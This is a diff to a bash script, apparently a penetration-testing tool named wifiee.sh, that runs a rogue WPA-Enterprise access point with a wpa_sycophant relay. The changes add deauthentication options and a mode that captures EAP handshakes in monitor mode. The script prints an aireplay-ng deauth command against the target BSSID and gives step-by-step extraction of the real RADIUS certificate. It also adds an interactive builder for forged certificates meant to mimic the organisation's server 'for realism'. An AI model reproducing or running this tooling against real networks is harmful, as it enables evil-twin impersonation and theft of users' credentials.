@@ -48,38 +48,64 @@ DEAUTH_DELAY="${DEAUTH_DELAY:-3}"      # Seconds between bursts
 # otherwise uses this fallback. Edit to match target org for realism.
 CERT_CN="${CERT_CN:-radius.corp.local}"
 CERT_ORG="${CERT_ORG:-IT Department}"
-CERT_SUBJECT="${CERT_SUBJECT:-/C=$COUNTRY/ST=State/L=City/O=$CERT_ORG/OU=IT/CN=$CERT_CN}"
+CERT_OU="${CERT_OU:-IT}"
+CERT_ST="${CERT_ST:-State}"
+CERT_L="${CERT_L:-City}"
+CERT_SUBJECT=""                        # Built interactively or from flags
+CERT_FILE="${CERT_FILE:-}"             # Path to pre-made cert (.crt)
+CERT_KEY_FILE="${CERT_KEY_FILE:-}"     # Path to pre-made key (.key)
+CERT_CAPTURE_ONLY=false                # Run in capture-only mode (grab handshake for cert extraction)
 
 ##############################################################################
 # CLI ARGUMENT PARSING
 ##############################################################################
 while [[ $# -gt 0 ]]; do
 	case "$1" in
-		--ssid)       SSID="$2";           shift 2 ;;
-		--bssid)      BSSID="$2";          shift 2 ;;
-		--channel)    CHANNEL="$2";        shift 2 ;;
-		--iface-ap)   IFACE_ROGUEAP="$2";  shift 2 ;;
-		--iface-relay) IFACE_RELAY="$2";   shift 2 ;;
-		--country)    COUNTRY="$2";        shift 2 ;;
-		--cert-cn)    CERT_CN="$2";        shift 2 ;;
-		--cert-org)   CERT_ORG="$2";       shift 2 ;;
-		--deauth)     DEAUTH_COUNT="$2";   shift 2 ;;
-		--no-deauth)  DEAUTH_COUNT=0;      shift   ;;
+		--ssid)        SSID="$2";            shift 2 ;;
+		--bssid)       BSSID="$2";           shift 2 ;;
+		--channel)     CHANNEL="$2";         shift 2 ;;
+		--iface-ap)    IFACE_ROGUEAP="$2";   shift 2 ;;
+		--iface-relay) IFACE_RELAY="$2";     shift 2 ;;
+		--country)     COUNTRY="$2";         shift 2 ;;
+		--cert-cn)     CERT_CN="$2";         shift 2 ;;
+		--cert-org)    CERT_ORG="$2";        shift 2 ;;
+		--cert-ou)     CERT_OU="$2";         shift 2 ;;
+		--cert-state)  CERT_ST="$2";         shift 2 ;;
+		--cert-city)   CERT_L="$2";          shift 2 ;;
+		--cert-file)   CERT_FILE="$2";       shift 2 ;;
+		--cert-key)    CERT_KEY_FILE="$2";   shift 2 ;;
+		--cert-capture) CERT_CAPTURE_ONLY=true; shift ;;
+		--deauth)      DEAUTH_COUNT="$2";    shift 2 ;;
+		--no-deauth)   DEAUTH_COUNT=0;       shift   ;;
 		--help|-h)
 			echo "Usage: sudo ./wifiee.sh [OPTIONS]"
 			echo ""
-			echo "Options:"
-			echo "  --ssid NAME         Target SSID (prompted if omitted)"
-			echo "  --bssid MAC         Target BSSID (auto-scanned if omitted)"
-			echo "  --channel N         Channel (auto-detected if omitted)"
-			echo "  --iface-ap IFACE    Rogue AP interface (default: wlan0)"
-			echo "  --iface-relay IFACE Relay interface (default: wlan1)"
-			echo "  --country CC        Regulatory domain (default: US)"
-			echo "  --cert-cn CN        Fake RADIUS cert CN (default: radius.corp.local)"
-			echo "  --cert-org ORG      Fake RADIUS cert Org (default: IT Department)"
-			echo "  --deauth N          Deauth burst count (default: 10)"
-			echo "  --no-deauth         Skip deauth phase"
-			echo "  -h, --help          Show this help"
+			echo "Target:"
+			echo "  --ssid NAME           Target SSID (prompted if omitted)"
+			echo "  --bssid MAC           Target BSSID (auto-scanned if omitted)"
+			echo "  --channel N           Channel (auto-detected if omitted)"
+			echo ""
+			echo "Interfaces:"
+			echo "  --iface-ap IFACE      Rogue AP interface (default: wlan0)"
+			echo "  --iface-relay IFACE   Relay interface (default: wlan1)"
+			echo "  --country CC          Regulatory domain (default: US)"
+			echo ""
+			echo "Certificate:"
+			echo "  --cert-cn CN          Common Name (default: radius.corp.local)"
+			echo "  --cert-org ORG        Organisation (default: IT Department)"
+			echo "  --cert-ou OU          Org Unit (default: IT)"
+			echo "  --cert-state ST       State/Province"
+			echo "  --cert-city CITY      City/Locality"
+			echo "  --cert-file PATH      Use existing certificate (.crt/.pem)"
+			echo "  --cert-key PATH       Use existing private key (.key)"
+			echo "  --cert-capture        Capture-only mode: grab EAP handshake"
+			echo "                        for cert extraction, then exit"
+			echo ""
+			echo "Deauth:"
+			echo "  --deauth N            Deauth burst count (default: 10)"
+			echo "  --no-deauth           Skip deauth phase"
+			echo ""
+			echo "  -h, --help            Show this help"
 			exit 0 ;;
 		*) echo "Unknown option: $1"; exit 1 ;;
 	esac
@@ -493,12 +519,88 @@ echo "[+] wpa_sycophant: $WORK_DIR/wpa_supplicant/wpa_supplicant"
 ##############################################################################
 # CERTIFICATE
 ##############################################################################
-prnt 'Generating certificates'
+prnt 'Certificate setup'
 
 [ ! -f "$DH_FILE" ] && openssl dhparam -out "$DH_FILE" 2048
 
-if [ ! -f "$CERT.key" ] || [ ! -f "$CERT.crt" ]; then
-	# Probe the real AP to extract RADIUS cert subject
+# ---- Capture-only mode: grab EAP handshake for cert extraction ----
+if [ "$CERT_CAPTURE_ONLY" = true ]; then
+	prnt 'CAPTURE MODE — grabbing EAP handshake for certificate extraction'
+	CAPTURE_FILE="$WORK_DIR/eap-handshake-$(date +%Y%m%d-%H%M%S).pcap"
+
+	echo "[*] Putting $IFACE_RELAY into monitor mode..."
+	ip link set "$IFACE_RELAY" down 2>/dev/null
+	iw dev "$IFACE_RELAY" set type monitor 2>/dev/null || err "Cannot set monitor mode on $IFACE_RELAY"
+	ip link set "$IFACE_RELAY" up
+	iw dev "$IFACE_RELAY" set channel "$ORIGINAL_CHANNEL" 2>/dev/null || true
+
+	echo "[*] Capturing EAP/TLS handshake on channel $ORIGINAL_CHANNEL..."
+	echo "[*] Target BSSID: $REAL_AP_BSSID"
+	echo "[*] Output: $CAPTURE_FILE"
+	echo ""
+	echo "[*] Wait for a client to authenticate (or deauth one from another terminal):"
+	echo "      sudo aireplay-ng -0 5 -a $REAL_AP_BSSID $IFACE_RELAY"
+	echo ""
+	echo "[*] Press Ctrl+C when you've captured enough"
+	echo ""
+
+	# Capture EAP frames only
+	tcpdump -i "$IFACE_RELAY" -w "$CAPTURE_FILE" \
+		"ether proto 0x888e or (type mgt subtype auth) or (type mgt subtype assoc-req) or (type mgt subtype assoc-resp)" \
+		2>/dev/null || \
+	tshark -i "$IFACE_RELAY" -w "$CAPTURE_FILE" \
+		-f "ether proto 0x888e" 2>/dev/null || \
+	err "Need tcpdump or tshark installed (apt install tcpdump tshark)"
+
+	# Restore managed mode
+	ip link set "$IFACE_RELAY" down
+	iw dev "$IFACE_RELAY" set type managed 2>/dev/null
+	ip link set "$IFACE_RELAY" up
+
+	echo ""
+	echo "[+] Capture saved: $CAPTURE_FILE"
+	echo ""
+	echo -e "${CYN}To extract the RADIUS certificate from the capture:${NC}"
+	echo ""
+	echo "  1. Open in Wireshark:"
+	echo "     wireshark $CAPTURE_FILE"
+	echo ""
+	echo "  2. Apply display filter:"
+	echo "     wlan.bssid==$REAL_AP_BSSID && eap && tls.handshake.certificate"
+	echo ""
+	echo "  3. Expand the TLS handshake > Certificate chain"
+	echo "     Right-click the certificate > Export Bytes > Save as server.der"
+	echo ""
+	echo "  4. Read the certificate details:"
+	echo "     openssl x509 -inform DER -in server.der -noout -subject -issuer"
+	echo ""
+	echo "  5. Use those details to create a matching rogue cert:"
+	echo "     sudo ./wifiee.sh --ssid \"$SSID\" \\"
+	echo "       --cert-cn \"<CN from step 4>\" \\"
+	echo "       --cert-org \"<O from step 4>\" \\"
+	echo "       --cert-ou \"<OU from step 4>\" \\"
+	echo "       --cert-state \"<ST from step 4>\" \\"
+	echo "       --cert-city \"<L from step 4>\""
+	echo ""
+	echo "  Or import the extracted cert directly:"
+	echo "     sudo ./wifiee.sh --ssid \"$SSID\" \\"
+	echo "       --cert-file server.crt --cert-key server.key"
+	echo ""
+	exit 0
+fi
+
+# ---- Use pre-made certificate if provided ----
+if [ -n "$CERT_FILE" ] && [ -n "$CERT_KEY_FILE" ]; then
+	[ ! -f "$CERT_FILE" ] && err "Certificate not found: $CERT_FILE"
+	[ ! -f "$CERT_KEY_FILE" ] && err "Key not found: $CERT_KEY_FILE"
+	cp "$CERT_FILE" "$CERT.crt"
+	cp "$CERT_KEY_FILE" "$CERT.key"
+	echo "[+] Using provided certificate:"
+	openssl x509 -in "$CERT.crt" -noout -subject 2>/dev/null | sed 's/^/     /'
+	echo "[+] Certificate imported"
+
+elif [ ! -f "$CERT.key" ] || [ ! -f "$CERT.crt" ]; then
+	# ---- Probe real AP for cert subject ----
 	cat <<EOD > "$WORK_DIR/wpa_supplicant.conf"
 p2p_disabled=1
 ctrl_interface=/var/run/wpa_supplicant_probe
@@ -528,15 +630,84 @@ EOD
 		| head -n1 | sed -E "s/.+subject='([^']+)'.+/\1/g")
 
 	if [ -n "$EXTRACTED_SUBJECT" ]; then
-		CERT_SUBJECT="$EXTRACTED_SUBJECT"
-		echo "[+] Extracted cert subject: $CERT_SUBJECT"
+		echo "[+] Extracted cert subject from real AP:"
+		echo "    $EXTRACTED_SUBJECT"
+		echo ""
+		echo "  1) Use extracted subject (recommended)"
+		echo "  2) Build custom certificate"
+		echo "  3) Use default fallback"
+		echo ""
+		read -p "  Select [1]: " cert_choice
 	else
-		warn "Could not extract RADIUS cert — using configured default"
+		warn "Could not extract RADIUS cert from probe"
+		echo ""
+		echo "  1) Build custom certificate"
+		echo "  2) Use default fallback"
+		echo "  3) Capture EAP handshake for manual extraction (see --cert-capture)"
+		echo ""
+		read -p "  Select [1]: " cert_choice
+		# Shift numbering since there's no extracted option
+		case "$cert_choice" in
+			1) cert_choice=2 ;;
+			2) cert_choice=3 ;;
+			3)
+				echo ""
+				echo "[*] Re-run with --cert-capture to grab the handshake."
+				echo "    See README.md for full certificate extraction workflow."
+				exit 0 ;;
+			*) cert_choice=2 ;;
+		esac
 	fi
 
-	openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 \
+	case "$cert_choice" in
+		1)
+			# Use extracted subject
+			CERT_SUBJECT="$EXTRACTED_SUBJECT"
+			echo "[+] Using extracted subject"
+			;;
+		2)
+			# Interactive custom certificate builder
+			echo ""
+			echo -e "${CYN}  Build custom certificate${NC}"
+			echo -e "  ${YLW}Tip: Match these to the real RADIUS cert for realism.${NC}"
+			echo -e "  ${YLW}Use --cert-capture or Wireshark to extract the real cert first.${NC}"
+			echo ""
+			read -p "  Country Code (2 letter, e.g. US, AU, GB) [$COUNTRY]: " input
+			CERT_C="${input:-$COUNTRY}"
+			read -p "  State/Province [$CERT_ST]: " input
+			CERT_ST="${input:-$CERT_ST}"
+			read -p "  City/Locality [$CERT_L]: " input
+			CERT_L="${input:-$CERT_L}"
+			read -p "  Organisation [$CERT_ORG]: " input
+			CERT_ORG="${input:-$CERT_ORG}"
+			read -p "  Organisational Unit [$CERT_OU]: " input
+			CERT_OU="${input:-$CERT_OU}"
+			read -p "  Common Name (FQDN of RADIUS server) [$CERT_CN]: " input
+			CERT_CN="${input:-$CERT_CN}"
+			read -p "  Validity (days) [365]: " input
+			CERT_DAYS="${input:-365}"
+			read -p "  Key size (2048/4096) [2048]: " input
+			CERT_KEYSIZE="${input:-2048}"
+
+			CERT_SUBJECT="/C=$CERT_C/ST=$CERT_ST/L=$CERT_L/O=$CERT_ORG/OU=$CERT_OU/CN=$CERT_CN"
+			echo ""
+			echo "[+] Subject: $CERT_SUBJECT"
+			;;
+		*)
+			# Default fallback
+			CERT_SUBJECT="/C=$COUNTRY/ST=$CERT_ST/L=$CERT_L/O=$CERT_ORG/OU=$CERT_OU/CN=$CERT_CN"
+			echo "[+] Using default: $CERT_SUBJECT"
+			;;
+	esac
+
+	CERT_DAYS="${CERT_DAYS:-365}"
+	CERT_KEYSIZE="${CERT_KEYSIZE:-2048}"
+
+	openssl req -new -newkey "rsa:$CERT_KEYSIZE" -days "$CERT_DAYS" -nodes -x509 \
 		-keyout "$CERT.key" -out "$CERT.crt" -subj "$CERT_SUBJECT" 2>/dev/null
 	echo "[+] Certificate generated"
+	echo "    $CERT.crt"
+	echo "    $CERT.key"
 fi
 
 iw reg set "$COUNTRY"
